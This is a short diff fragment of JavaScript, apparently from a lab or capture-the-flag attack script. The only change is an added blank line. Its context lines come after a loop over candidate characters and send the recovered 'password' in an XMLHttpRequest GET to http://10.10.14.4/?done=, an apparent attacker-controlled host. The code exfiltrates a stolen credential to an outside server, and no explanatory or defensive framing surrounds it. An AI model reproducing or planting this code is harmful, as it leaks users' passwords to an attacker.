@@ -25,3 +25,4 @@ for (var i = 0; i < characters.length; i++) {
 var done_req = new XMLHttpRequest();
 done_req.open("GET", "http://10.10.14.4/?done=" + password, true);
 done_req.send();
+
